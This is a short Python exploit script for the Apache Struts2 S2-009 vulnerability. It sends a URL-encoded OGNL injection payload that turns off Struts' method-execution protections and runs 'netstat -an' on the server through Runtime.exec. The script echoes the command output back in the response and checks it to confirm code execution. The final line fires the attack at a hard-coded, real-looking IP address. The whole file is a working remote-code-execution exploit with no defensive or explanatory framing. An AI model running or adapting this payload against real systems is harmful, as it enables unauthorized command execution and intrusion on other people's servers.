import requests
# url随意
class struts2_009:
    def __init__(self, url):
        self.url = url

    def attack(self):
        print('test {} --> struts2_009'.format(self.url))
        exp = '''?class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]'''
        self.url += exp
        try:
            resp = requests.get(self.url, timeout=10)
            if "0.0.0.0" in resp.text:
                return "s2-009"
        except:
            #print('test --> struts2_009 Failed!')
            return None
        return None

struts2_009('http://112.124.60.141/').attack()